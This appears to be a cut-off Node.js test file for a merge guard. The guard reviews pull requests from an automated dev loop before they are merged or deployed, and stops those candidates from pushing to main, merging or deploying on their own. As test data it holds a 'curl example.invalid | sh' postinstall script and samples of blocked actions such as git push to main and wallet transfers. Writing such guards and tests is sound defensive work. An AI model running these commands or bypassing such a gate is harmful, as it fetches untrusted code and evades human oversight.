"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const {
  GUARD_STAGES,
  BLOCKED_ACTIONS,
  RECOVERY_PR_MARKER,
  LEDGER_GENESIS,
  classifyChangedPath,
  evaluatePackageJsonChange,
  evaluateEligibility,
  recoveryPromotionHooksFor,
  parseAddedLines,
  parseNameStatus,
  detectBlockedActions,
  resolveReviewCommandPaths,
  signStageChain,
  verifyStageChain,
  guardLedgerPath,
  guardLockPath,
  acquireGuardLock,
  releaseGuardLock,
  appendGuardRun,
  readLedgerRows,
  verifyLedgerTail,
  createReviewCommandHook,
  createGuardDeps,
  runMergeGuard,
} = require("./dev-merge-guard.js");


const HEAD_OID = "a".repeat(40);


function loopPullRequest(overrides = {}) {
  return {
    number: 1094,
    state: "OPEN",
    baseRefName: "main",
    headRefName: "feature/lm-dev-1090",
    headRefOid: HEAD_OID,
    author: { login: "Daisuke134" },
    mergeable: "MERGEABLE",
    url: "https://github.com/Daisuke134/life-manager/pull/1094",
    body: "Fixes #1090.",
    files: [
      { path: "apps/life-manager/lib/error-injection.js" },
      { path: "apps/life-manager/lib/error-injection.test.js" },
      { path: "apps/life-manager/scripts/error-intake-inject.js" },
    ],
    ...overrides,
  };
}


const CLEAN_DIFF = [
  "diff --git a/apps/life-manager/lib/error-injection.js b/apps/life-manager/lib/error-injection.js",
  "--- a/apps/life-manager/lib/error-injection.js",
  "+++ b/apps/life-manager/lib/error-injection.js",
  "@@ -1,3 +1,4 @@",
  " const x = 1;",
  "+function classifySignal(signal) { return signal; }",
  "-const dead = 2;",
].join("\n");


function tempLedger() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "lm-guard-ledger-"));
  return path.join(dir, "dev-guard-runs.jsonl");
}


function readLedger(file) {
  return fs.readFileSync(file, "utf8")
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line));
}


function stubDeps(overrides = {}) {
  const calls = { merge: 0, redeploy: 0, rollback: 0, revertPr: 0, alerts: [] };
  let clock = Date.parse("2026-07-27T00:00:00.000Z");
  const deps = {
    calls,
    now: () => new Date((clock += 1000)),
    sleep: async () => {},
    ledgerPath: overrides.ledgerPath,
    getPullRequest: async () => loopPullRequest(overrides.pr),
    // The authoritative file list is git's, not gh's (see the truncation/rename finding); the
    // default stub mirrors the PR fixture so only the tests that care have to diverge.
    listChangedFiles: async () => (
      overrides.changedFiles ?? loopPullRequest(overrides.pr).files.map((entry) => entry.path)
    ),
    getDiff: async () => overrides.diff ?? CLEAN_DIFF,
    readFileAtRef: async () => null,
    runTests: async () => ({ ok: true, exitCode: 0, output: "npm test ok\nnpm run eval ok" }),
    review: async () => ({ verdict: "pass", findings: [] }),
    merge: async () => {
      calls.merge += 1;
      return { ok: true, mergeSha: "b".repeat(40) };
    },
    getPreviousSuccessfulDeployment: async () => ({
      id: "dep-prev",
      status: "SUCCESS",
      canRollback: true,
      commitHash: "c".repeat(40),
    }),
    listDeployments: async () => [
      { id: "dep-new", status: "SUCCESS", meta: { commitHash: "b".repeat(40) } },
      { id: "dep-prev", status: "SUCCESS", meta: { commitHash: "c".repeat(40) } },
    ],
    triggerRedeploy: async () => {
      calls.redeploy += 1;
      return { ok: true };
    },
    checkHealth: async () => true,
    rollback: async () => {
      calls.rollback += 1;
      return { ok: true };
    },
    openRevertPr: async () => {
      calls.revertPr += 1;
      return { url: "https://github.com/Daisuke134/life-manager/pull/9999" };
    },
    alert: async (message) => { calls.alerts.push(message); },
  };
  return Object.assign(deps, overrides.deps || {});
}


// Review and the blocked-actions tripwire come BEFORE the test suite because `npm test` executes
// the PR's own code. A reviewer that only sees a diff after the runner already ran it is a
// post-mortem, not a gate.
test("guard stages run in the documented order, with review before any PR code executes", () => {
  assert.deepEqual(GUARD_STAGES, [
    "eligibility",
    "review",
    "blocked_actions",
    "tests",
    "merge",
    "deploy_health",
  ]);
});


test("path allowlist admits the three loop-owned directories", () => {
  for (const file of [
    "apps/life-manager/lib/error-injection.js",
    "apps/life-manager/lib/transport/mail-gog.js",
    "apps/life-manager/test/inngest.test.js",
    "apps/life-manager/scripts/error-intake-inject.js",
    "runtime/loop/provider_adapter.py",
    "runtime/loop/tests/test_provider_adapter.py",
  ]) {
    assert.equal(classifyChangedPath(file).allowed, true, file);
  }
});

test("the recovery control plane and evaluator remain protected from their own candidates", () => {
  for (const file of [
    "runtime/loop/lm_loop.py",
    "runtime/loop/lm_loop_run.py",
    "runtime/loop/runtime_event.py",
    "runtime/loop/recovery-supervisor.mjs",
    "apps/life-manager/lib/recovery-self-build-bridge.js",
    "apps/life-manager/lib/product-onboarding.js",
    "apps/life-manager/scripts/local-foundation-gate.js",
  ]) {
    assert.deepEqual(classifyChangedPath(file), { allowed: false, rule: "deny:guard-self" }, file);
  }
});


test("path allowlist refuses workflows, migrations, env files, the spec and skills", () => {
  const cases = [
    [".github/workflows/deploy.yml", "deny:workflow"],
    [".github/actions/thing/action.yml", "deny:workflow"],
    ["apps/life-manager/lib/migrations/003-add-column.sql", "deny:migration"],
    ["apps/life-manager/scripts/migration/backfill.js", "deny:migration"],
    ["apps/life-manager/.env.example", "deny:env"],
    ["apps/life-manager/lib/.env.production", "deny:env"],
    ["docs/superpowers/specs/2026-07-19-anicca-one-repo-consolidation-spec.md", "deny:spec"],
    ["skills/earn/marketing-engine/run_agent.sh", "deny:skill"],
    ["apps/life-manager/server.js", "deny:not-allowlisted"],
    ["README.md", "deny:not-allowlisted"],
  ];
  for (const [file, rule] of cases) {
    const verdict = classifyChangedPath(file);
    assert.equal(verdict.allowed, false, file);
    assert.equal(verdict.rule, rule, file);
  }
});


test("package.json is conditional, never plainly allowed", () => {
  const verdict = classifyChangedPath("apps/life-manager/package.json");
  assert.equal(verdict.allowed, false);
  assert.equal(verdict.conditional, true);
  assert.equal(verdict.rule, "conditional:package-json");
});


test("package.json runtime dependency changes are refused", () => {
  const before = { dependencies: { pg: "8.22.0" }, scripts: { test: "node --test a.js" } };
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      dependencies: { pg: "8.22.0", axios: "^1.0.0" },
      scripts: { test: "node --test a.js" },
    }).reasons,
    ["dependencies_changed"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      dependencies: { pg: "8.23.0" },
      scripts: { test: "node --test a.js" },
    }).reasons,
    ["dependencies_changed"],
  );
});


test("package.json devDependency additions and test-line additions are allowed", () => {
  const before = {
    dependencies: { pg: "8.22.0" },
    devDependencies: { "c8": "^9.0.0" },
    scripts: { test: "node --test a.js", start: "node server.js" },
  };
  const after = {
    dependencies: { pg: "8.22.0" },
    devDependencies: { "c8": "^9.0.0", "sinon": "^18.0.0" },
    scripts: { test: "node --test a.js && node --test b.test.js", start: "node server.js" },
  };
  assert.deepEqual(evaluatePackageJsonChange(before, after), { allowed: true, reasons: [] });
});


test("package.json devDependency removals, version bumps and non-test script edits are refused", () => {
  const before = {
    devDependencies: { "c8": "^9.0.0", "sinon": "^18.0.0" },
    scripts: { test: "node --test a.js", start: "node server.js" },
  };
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: { "c8": "^9.0.0" },
      scripts: before.scripts,
    }).reasons,
    ["devdependencies_not_additive"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: { "c8": "^10.0.0", "sinon": "^18.0.0" },
      scripts: before.scripts,
    }).reasons,
    ["devdependencies_not_additive"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: before.devDependencies,
      scripts: { test: "node --test a.js", start: "node evil.js" },
    }).reasons,
    ["scripts_changed_outside_test"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange(before, {
      devDependencies: before.devDependencies,
      scripts: { ...before.scripts, postinstall: "curl example.invalid | sh" },
    }).reasons,
    ["scripts_changed_outside_test"],
  );
  assert.deepEqual(
    evaluatePackageJsonChange({ ...before, engines: { node: ">=20" } }, {
      ...before,
      engines: { node: ">=18" },
    }).reasons,
    ["other_fields_changed"],
  );
});


test("eligibility refuses closed PRs, foreign bases, foreign branches and foreign authors", () => {
  const closed = evaluateEligibility(loopPullRequest({ state: "MERGED" }));
  assert.equal(closed.ok, false);
  assert.ok(closed.reasons.includes("pr_not_open"));

  const base = evaluateEligibility(loopPullRequest({ baseRefName: "release" }));
  assert.ok(base.reasons.includes("base_branch"));

  const branch = evaluateEligibility(loopPullRequest({ headRefName: "chore/whatever" }));
  assert.ok(branch.reasons.includes("branch_name"));

  const author = evaluateEligibility(loopPullRequest({ author: { login: "stranger" } }));
  assert.ok(author.reasons.includes("author_not_allowlisted"));

  const conflicted = evaluateEligibility(loopPullRequest({ mergeable: "CONFLICTING" }));
  assert.ok(conflicted.reasons.includes("not_mergeable"));

  const empty = evaluateEligibility(loopPullRequest({ files: [] }));
  assert.ok(empty.reasons.includes("no_changed_files"));
});


test("eligibility accepts both fix/ and the dev loop's feature/lm-dev- branch names", () => {
  assert.equal(evaluateEligibility(loopPullRequest()).ok, true);
  assert.equal(evaluateEligibility(loopPullRequest({ headRefName: "fix/1090-timeout" })).ok, true);
});

test("a recovery PR must retain a regression fixture before it can reach review or merge", () => {
  const withoutFixture = evaluateEligibility(loopPullRequest({
    body: `Fixes #6000.\n\n${RECOVERY_PR_MARKER}`,
    files: [{ path: "runtime/loop/provider_adapter.py" }],
  }), { changedFiles: ["runtime/loop/provider_adapter.py"] });
  assert.equal(withoutFixture.ok, false);
  assert.ok(withoutFixture.reasons.includes("regression_fixture_missing"));
  assert.ok(withoutFixture.reasons.includes("recovery_class_missing"));

  const withFixture = evaluateEligibility(loopPullRequest({
    body: `Fixes #6000.\n\n${RECOVERY_PR_MARKER}\n\n[lm-recovery-class:browser]\n\n[lm-recovery-owner:some-owner]`,
    files: [
      { path: "runtime/loop/provider_adapter.py" },
      { path: "runtime/loop/tests/test_provider_adapter.py" },
    ],
  }), {
    changedFiles: ["runtime/loop/provider_adapter.py", "runtime/loop/tests/test_provider_adapter.py"],
  });
  assert.equal(withFixture.ok, false);
  assert.deepEqual(withFixture.reasons, ["recovery_promotion_hooks_incomplete"]);
});

test("a recovery candidate stays closed even with hook claims until a loop runtime path is bound", () => {
  const verdict = evaluateEligibility(loopPullRequest({
    body: `Fixes #6000.\n\n${RECOVERY_PR_MARKER}\n\n[lm-recovery-class:browser]\n\n[lm-recovery-owner:some-owner]`,
    files: [
      { path: "runtime/loop/provider_adapter.py" },
      { path: "runtime/loop/tests/test_provider_adapter.py" },
    ],
  }), {
    changedFiles: ["runtime/loop/provider_adapter.py", "runtime/loop/tests/test_provider_adapter.py"],
    recoveryPromotionHooks: {
      immutable_release: true,
      isolated_canary: true,
      exact_health: true,
      rollback: true,
    },
  });
  assert.equal(verdict.ok, false);
  assert.deepEqual(verdict.reasons, ["recovery_runtime_promotion_unbound"]);
});


test("a recovery PR with a missing or duplicate owner marker is ineligible", () => {
  const missing = evaluateEligibility(loopPullRequest({
    body: `Fixes #6000.\n\n${RECOVERY_PR_MARKER}\n\n[lm-recovery-class:deterministic]`,
    files: [
      { path: "runtime/loop/provider_adapter.py" },
      { path: "runtime/loop/tests/test_provider_adapter.py" },
    ],
  }), {
    changedFiles: ["runtime/loop/provider_adapter.py", "runtime/loop/tests/test_provider_adapter.py"],
  });
  assert.ok(missing.reasons.includes("recovery_owner_missing"));

  const duplicate = evaluateEligibility(loopPullRequest({
    body: `Fixes #6000.\n\n${RECOVERY_PR_MARKER}\n\n[lm-recovery-class:deterministic]`
      + "\n\n[lm-recovery-owner:owner-a]\n\n[lm-recovery-owner:owner-b]",
    files: [
      { path: "runtime/loop/provider_adapter.py" },
      { path: "runtime/loop/tests/test_provider_adapter.py" },
    ],
  }), {
    changedFiles: ["runtime/loop/provider_adapter.py", "runtime/loop/tests/test_provider_adapter.py"],
  });
  assert.ok(duplicate.reasons.includes("recovery_owner_missing"));
});

test("recoveryPromotionHooksFor refuses a PR body class that lies about the registry", () => {
  const deterministicEntry = {
    label: "ai.anicca.deterministic-owner", effect_class: "none", provider_route: "deterministic",
    cadence: { start_interval_seconds: 30 },
  };
  const modelEntry = {
    label: "ai.anicca.model-owner", effect_class: "none", provider_route: "shared-agent-runner",
    cadence: { start_interval_seconds: 30 },
  };
  const effectfulEntry = {
    label: "ai.anicca.effectful-owner", effect_class: "publish", provider_route: "deterministic",
    cadence: { start_interval_seconds: 30 },
  };
  const registry = { loops: {
    "deterministic-owner": deterministicEntry, "model-owner": modelEntry, "effectful-owner": effectfulEntry,
  } };

  // Registry agrees: all four hooks are bound.
  assert.deepEqual(recoveryPromotionHooksFor("deterministic", "deterministic-owner", registry), {
    immutable_release: true, isolated_canary: true, exact_health: true, rollback: true,
  });
  // PR body claims deterministic, but the registry says this owner is a model job: no hooks.
  assert.deepEqual(recoveryPromotionHooksFor("deterministic", "model-owner", registry), {});
  // PR body claims deterministic, but the registry says this owner is effectful: no hooks.
  assert.deepEqual(recoveryPromotionHooksFor("deterministic", "effectful-owner", registry), {});
  // Unknown owner: no hooks.
  assert.deepEqual(recoveryPromotionHooksFor("deterministic", "no-such-owner", registry), {});
});


test("a deterministic recovery PR with a registry-verified owner becomes eligible and its post-merge promotion is invoked", async () => {
  const registry = { loops: {
    "deterministic-owner": {
      label: "ai.anicca.deterministic-owner", effect_class: "none", provider_route: "deterministic",
      cadence: { start_interval_seconds: 30 },
    },
  } };
  const ledgerPath = tempLedger();
  const promotionCalls = [];
  const deps = stubDeps({
    ledgerPath,
    pr: {
      body: `Fixes #6000.\n\n${RECOVERY_PR_MARKER}\n\n[lm-recovery-class:deterministic]`
        + "\n\n[lm-recovery-owner:deterministic-owner]",
    },
    changedFiles: [
      "runtime/loop/provider_adapter.py", "runtime/loop/tests/test_provider_adapter.py",
    ],
    deps: {
      getLoopRegistry: async () => registry,
      promoteLoopRuntimeRepair: async (args) => {
        promotionCalls.push(args);
        return {
          ok: true, owner_id: args.ownerId, merged_sha: args.mergedSha,
          release_path: "/loops/releases/new", previous_release_path: "/loops/releases/old",
          hooks: [], rolled_back: false,
        };
      },
    },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "merged_deployed");
  assert.equal(deps.calls.merge, 1);
  assert.equal(deps.calls.redeploy, 0, "a recovery PR must never take the Railway deploy path");
  assert.equal(promotionCalls.length, 1);
  assert.equal(promotionCalls[0].ownerId, "deterministic-owner");
  assert.equal(promotionCalls[0].mergedSha, "b".repeat(40));
  const [row] = readLedger(ledgerPath);
  assert.equal(row.verdict, "merged_deployed");
  const stage = row.stages.find((entry) => entry.stage === "deploy_health");
  assert.equal(stage.ok, true);
  assert.equal(stage.evidence.promotion.ok, true);
});

test("a failed loop-runtime promotion is recorded as rolled_back or rollback_failed, never merged_deployed", async () => {
  const registry = { loops: {
    "deterministic-owner": {
      label: "ai.anicca.deterministic-owner", effect_class: "none", provider_route: "deterministic",
      cadence: { start_interval_seconds: 30 },
    },
  } };
  const deps = stubDeps({
    ledgerPath: tempLedger(),
    pr: {
      body: `Fixes #6000.\n\n${RECOVERY_PR_MARKER}\n\n[lm-recovery-class:deterministic]`
        + "\n\n[lm-recovery-owner:deterministic-owner]",
    },
    changedFiles: [
      "runtime/loop/provider_adapter.py", "runtime/loop/tests/test_provider_adapter.py",
    ],
    deps: {
      getLoopRegistry: async () => registry,
      promoteLoopRuntimeRepair: async () => ({
        ok: false, reason: "recovery_promotion_health_failed", release_path: "/loops/releases/new",
        previous_release_path: "/loops/releases/old", hooks: [], rolled_back: true,
      }),
    },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "rolled_back");
  assert.ok(deps.calls.alerts.some((message) => message.includes("loop-runtime promotion")));
  assert.equal(deps.calls.redeploy, 0);
});


test("eligibility reports the exact offending path and marks package.json conditional", () => {
  const workflow = evaluateEligibility(loopPullRequest({
    files: [
      { path: "apps/life-manager/lib/error-injection.js" },
      { path: ".github/workflows/deploy.yml" },
    ],
  }));
  assert.equal(workflow.ok, false);
  assert.ok(workflow.reasons.includes("path_allowlist"));
  assert.deepEqual(workflow.deniedPaths, [
    { path: ".github/workflows/deploy.yml", rule: "deny:workflow" },
  ]);

  const manifest = evaluateEligibility(loopPullRequest({
    files: [
      { path: "apps/life-manager/lib/error-injection.js" },
      { path: "apps/life-manager/package.json" },
    ],
  }));
  assert.deepEqual(manifest.conditionalPaths, ["apps/life-manager/package.json"]);
  assert.equal(manifest.ok, true);
});


test("added lines are attributed to their file and exclude removals and headers", () => {
  const added = parseAddedLines(CLEAN_DIFF);
  assert.deepEqual(added, [{
    path: "apps/life-manager/lib/error-injection.js",
    line: "function classifySignal(signal) { return signal; }",
  }]);
});


test("blocked actions cover outreach, payment and wallet transfer with a rationale each", () => {
  assert.deepEqual(
    BLOCKED_ACTIONS.map((entry) => entry.action).sort(),
    ["direct_deploy", "direct_main_promotion", "outreach_send", "payment", "wallet_transfer"],
  );
  for (const entry of BLOCKED_ACTIONS) {
    assert.equal(typeof entry.rationale, "string");
    assert.ok(entry.rationale.length > 20, entry.action);
  }
});

test("recovery candidates cannot push main, merge their PR, or deploy around the guard", () => {
  const hits = detectBlockedActions([
    { path: "runtime/loop/x.py", line: 'subprocess.run(["git", "push", "origin", "main"])' },
    { path: "apps/life-manager/lib/x.js", line: 'execFileSync("gh", ["pr", "merge", "6000"])' },
    { path: "apps/life-manager/lib/y.js", line: 'execFileSync("railway", ["redeploy", "--yes"])' },
  ]);
  assert.deepEqual(hits.map((hit) => hit.action), [
    "direct_main_promotion", "direct_main_promotion", "direct_deploy",
  ]);
});


test("blocked actions are detected on added lines only", () => {
  assert.deepEqual(detectBlockedActions(parseAddedLines(CLEAN_DIFF)), []);

  const hits = detectBlockedActions([
    { path: "apps/life-manager/lib/x.js", line: "await sendOutreach(target);" },
    { path: "apps/life-manager/lib/y.js", line: "stripe.paymentIntents.create({ amount });" },
    { path: "apps/life-manager/lib/z.js", line: "const tx = await wallet.transfer(to, amount);" },
    { path: "apps/life-manager/lib/ok.js", line: "// documentation about payment flows" },
  ]);
  assert.deepEqual(hits.map((hit) => hit.action), ["outreach_send", "payment", "wallet_transfer"]);
  assert.equal(hits[0].path, "apps/life-manager/lib/x.js");
  assert.ok(hits[0].rationale.length > 20);
});


test("the guard's own blocklist definition lines are exempt so the loop can update the guard", () => {
  const source = fs.readFileSync(path.join(__dirname, "dev-merge-guard.js"), "utf8");
  const ownAdditions = source
    .split("\n")
    .filter((line) => /^\s*pattern:\s*\//.test(line))
    .map((line) => ({ path: "apps/life-manager/lib/dev-merge-guard.js", line }));
  assert.ok(ownAdditions.length >= 3);
  assert.deepEqual(detectBlockedActions(ownAdditions), []);
  assert.deepEqual(
    detectBlockedActions([{
      path: "apps/life-manager/lib/dev-merge-guard.js",
      line: "  await sendOutreach(target);",
    }]).map((hit) => hit.action),
    ["outreach_send"],
  );
});


test("stage records form a verifiable signature chain", () => {
  const stages = signStageChain("run-1", [
    { stage: "eligibility", ok: true, reason: null, evidence: { paths: 3 } },
    { stage: "tests", ok: true, reason: null, evidence: { exitCode: 0 } },
  ]);
  assert.equal(stages.length, 2);
  for (const record of stages) assert.match(record.signature, /^[a-f0-9]{64}$/);
  assert.equal(stages[1].prev, stages[0].signature);
  assert.equal(verifyStageChain("run-1", stages), true);

  const tampered = stages.map((record) => ({ ...record }));
  tampered[0].ok = false;
  assert.equal(verifyStageChain("run-1", tampered), false);
});


test("the ledger path honours LM_DEV_GUARD_LEDGER and otherwise lands in the state dir", () => {
  assert.equal(guardLedgerPath({ LM_DEV_GUARD_LEDGER: "/tmp/x.jsonl" }), "/tmp/x.jsonl");
  assert.equal(
    guardLedgerPath({ HOME: "/home/life-manager" }),
    "/home/life-manager/.life-manager/state/dev-guard-runs.jsonl",
  );
});


test("a passing run merges, redeploys, proves health and a fresh deployment id", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({ ledgerPath });
  const result = await runMergeGuard({ prNumber: 1094, deps });

  assert.equal(result.verdict, "merged_deployed");
  assert.equal(result.stoppedAtStage, null);
  assert.equal(deps.calls.merge, 1);
  assert.equal(deps.calls.redeploy, 1);
  assert.equal(deps.calls.rollback, 0);
  assert.equal(result.mergeSha, "b".repeat(40));
  assert.equal(result.deployId, "dep-new");
  assert.equal(result.health, "ok");
  assert.deepEqual(result.stagesPassed, GUARD_STAGES);

  const [row] = readLedger(ledgerPath);
  assert.deepEqual(Object.keys(row).sort(), [
    "deploy_id",
    "duration_ms",
    "finished_at",
    "health",
    "ledger_check",
    "merge_sha",
    "post_merge_error",
    "pr",
    "prev",
    "record_hash",
    "rollback",
    "run_id",
    "schema_version",
    "stages",
    "stages_failed",
    "stages_passed",
    "started_at",
    "stop_reason",
    "stopped_at_stage",
    "verdict",
  ]);
  assert.equal(row.schema_version, 2);
  assert.equal(row.post_merge_error, null);
  assert.equal(row.prev, LEDGER_GENESIS);
  assert.equal(row.pr, 1094);
  assert.equal(row.verdict, "merged_deployed");
  assert.deepEqual(row.stages_passed, GUARD_STAGES);
  assert.deepEqual(row.stages_failed, []);
  assert.equal(row.merge_sha, "b".repeat(40));
  assert.equal(row.deploy_id, "dep-new");
  assert.equal(row.health, "ok");
  assert.equal(row.rollback, null);
  assert.ok(Number.isInteger(row.duration_ms) && row.duration_ms >= 0);
  assert.equal(verifyStageChain(row.run_id, row.stages), true);
  assert.equal(row.stop_reason, null);
  for (const stage of row.stages) assert.equal(stage.reason, null, stage.stage);
});


test("an ineligible PR stops before merge with an honest verdict", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    pr: { files: [{ path: ".github/workflows/deploy.yml" }] },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });

  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "eligibility");
  assert.ok(result.stopReason.includes("path_allowlist"));
  assert.equal(deps.calls.merge, 0);
  assert.equal(deps.calls.redeploy, 0);
  assert.equal(result.mergeSha, null);

  const [row] = readLedger(ledgerPath);
  assert.deepEqual(row.stages_passed, []);
  assert.deepEqual(row.stages_failed, ["eligibility"]);
  assert.equal(row.health, "skipped");
});


test("a conditional package.json change is resolved against both refs before merge", async () => {
  const ledgerPath = tempLedger();
  const before = JSON.stringify({ dependencies: { pg: "8.22.0" }, scripts: { test: "node --test a.js" } });
  const after = JSON.stringify({ dependencies: { pg: "8.22.0", axios: "^1" }, scripts: { test: "node --test a.js" } });
  const deps = stubDeps({
    ledgerPath,
    pr: { files: [{ path: "apps/life-manager/package.json" }] },
    deps: {
      readFileAtRef: async ({ ref }) => (ref === "main" ? before : after),
    },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "eligibility");
  assert.ok(result.stopReason.includes("package_json:dependencies_changed"));
  assert.equal(deps.calls.merge, 0);
});


test("a red test suite stops before merge", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: { runTests: async () => ({ ok: false, exitCode: 1, output: "1 failing" }) },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "tests");
  assert.equal(deps.calls.merge, 0);
  const [row] = readLedger(ledgerPath);
  assert.deepEqual(row.stages_failed, ["tests"]);
  assert.deepEqual(row.stages_passed, ["eligibility", "review", "blocked_actions"]);
});


test("the reviewer sees the diff before the runner ever executes the PR's code", async () => {
  const order = [];
  const deps = stubDeps({
    ledgerPath: tempLedger(),
    deps: {
      review: async () => { order.push("review"); return { verdict: "fail", findings: ["no"] }; },
      runTests: async () => { order.push("tests"); return { ok: true, exitCode: 0, output: "" }; },
    },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.stoppedAtStage, "review");
  assert.deepEqual(order, ["review"], "a rejected PR must never reach `npm test`");
});


test("a FAIL adversary verdict stops before merge and keeps the findings", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      review: async () => ({ verdict: "fail", findings: ["drops the retry budget"] }),
    },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "review");
  assert.equal(deps.calls.merge, 0);
  const [row] = readLedger(ledgerPath);
  const review = row.stages.find((entry) => entry.stage === "review");
  assert.deepEqual(review.evidence.findings, ["drops the retry budget"]);
});


test("an unusable adversary answer is a FAIL, not a pass", async () => {
  for (const answer of [null, {}, { verdict: "maybe" }, { verdict: "PASS" }]) {
    const deps = stubDeps({ ledgerPath: tempLedger(), deps: { review: async () => answer } });
    const result = await runMergeGuard({ prNumber: 1094, deps });
    assert.equal(result.stoppedAtStage, "review", JSON.stringify(answer));
    assert.equal(deps.calls.merge, 0);
  }
});


test("a blocked action in the diff stops before merge", async () => {
  const ledgerPath = tempLedger();
  const diff = [
    "diff --git a/apps/life-manager/lib/x.js b/apps/life-manager/lib/x.js",
    "+++ b/apps/life-manager/lib/x.js",
    "+  await wallet.transfer(to, amount);",
  ].join("\n");
  const deps = stubDeps({ ledgerPath, diff });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "blocked_actions");
  assert.equal(deps.calls.merge, 0);
  const [row] = readLedger(ledgerPath);
  const stage = row.stages.find((entry) => entry.stage === "blocked_actions");
  assert.deepEqual(stage.evidence.hits.map((hit) => hit.action), ["wallet_transfer"]);
});


test("a failed merge stops without touching deploy", async () => {
  const deps = stubDeps({
    ledgerPath: tempLedger(),
    deps: { merge: async () => ({ ok: false, reason: "merge_conflict" }) },
  });
  const result = await runMergeGuard({ prNumber: 1094, deps });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "merge");
  assert.equal(deps.calls.redeploy, 0);
});


test("health that never comes back rolls the previous deployment back", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: { checkHealth: async () => false },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 3000, healthIntervalMs: 1000 },
  });

  assert.equal(result.verdict, "rolled_back");
  assert.equal(result.stoppedAtStage, "deploy_health");
  assert.equal(result.health, "failed");
  assert.equal(deps.calls.rollback, 1);
  assert.equal(deps.calls.revertPr, 0);
  assert.equal(deps.calls.alerts.length, 1);

  const [row] = readLedger(ledgerPath);
  assert.equal(row.merge_sha, "b".repeat(40));
  assert.equal(row.rollback.method, "railway_api_deployment_rollback");
  assert.equal(row.rollback.target_deployment_id, "dep-prev");
  assert.equal(row.rollback.ok, true);
  assert.ok(row.stages.some((entry) => entry.stage === "rollback"));
});


test("when the previous deployment cannot be rolled back the guard opens a revert PR and alerts", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      checkHealth: async () => false,
      getPreviousSuccessfulDeployment: async () => ({
        id: "dep-prev",
        status: "SUCCESS",
        canRollback: false,
        commitHash: "c".repeat(40),
      }),
    },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 2000, healthIntervalMs: 1000 },
  });

  assert.equal(result.verdict, "rolled_back");
  assert.equal(deps.calls.rollback, 0);
  assert.equal(deps.calls.revertPr, 1);
  const [row] = readLedger(ledgerPath);
  assert.equal(row.rollback.method, "revert_pr");
  assert.equal(row.rollback.revert_pr_url, "https://github.com/Daisuke134/life-manager/pull/9999");
  assert.ok(deps.calls.alerts.some((message) => message.includes("revert")));
});


test("a healthy deploy that never produces a new deployment id is not called fresh", async () => {
  const ledgerPath = tempLedger();
  const deps = stubDeps({
    ledgerPath,
    deps: {
      listDeployments: async () => [
        { id: "dep-prev", status: "SUCCESS", meta: { commitHash: "c".repeat(40) } },
      ],
    },
  });
  const result = await runMergeGuard({
    prNumber: 1094,
    deps,
    options: { healthTimeoutMs: 2000, healthIntervalMs: 1000, freshTimeoutMs: 2000 },
  });
  assert.equal(result.verdict, "stopped");
  assert.equal(result.stoppedAtStage, "deploy_health");
  assert.equal(result.stopReason, "deploy_freshness_unverified");
  assert.equal(result.health, "ok");
  assert.equal(deps.calls.rollback, 0);
  assert.ok(deps.calls.alerts.length >= 1);
});


test("the review command hook pipes the diff and reads a JSON verdict", async () => {
  const seen = {};
  const hook = createReviewCommandHook("my-reviewer --json", {
    exec: (file, args, options) => {
      seen.file = file;
      seen.args = args;
      seen.input = options.input;
      return JSON.stringify({ verdict: "pass", findings: [] });
    },
  });
  assert.deepEqual(await hook("THE DIFF", { prNumber: 7 }), { verdict: "pass", findings: [] });
  assert.equal(seen.file, "/bin/sh");
  assert.deepEqual(seen.args, ["-c", "my-reviewer --json"]);
  assert.equal(seen.input, "THE DIFF");
});


test("a review command that does not answer in JSON is a FAIL", async () => {
  const hook = createReviewCommandHook("noisy", { exec: () => "not json at all" });
  const verdict = await hook("d", {});
  assert.equal(verdict.verdict, "fail");
  assert.ok(verdict.findings.length > 0);
});


test("createGuardDeps rolls back through the railway GraphQL API, which is the only supported path", async () => {
  const commands = [];
  const deps = createGuardDeps({
    gh: (args) => {
      commands.push(["gh", ...args]);
      return "{}";
    },
    exec: (file, args) => {
      commands.push([file, ...args]);
      if (file === "railway" && args[0] === "api") {
        return JSON.stringify({ data: { deploymentRollback: true } });
      }
      return "{}";
    },
    fetch: async () => ({ ok: true, json: async () => ({ ok: true }) }),
  });

  const rollback = await deps.rollback({ deploymentId: "dep-prev" });
  assert.equal(rollback.ok, true);
  const call = commands.find((entry) => entry[0] === "railway" && entry[1] === "api");
  assert.ok(call, "rollback must go through `railway api`");
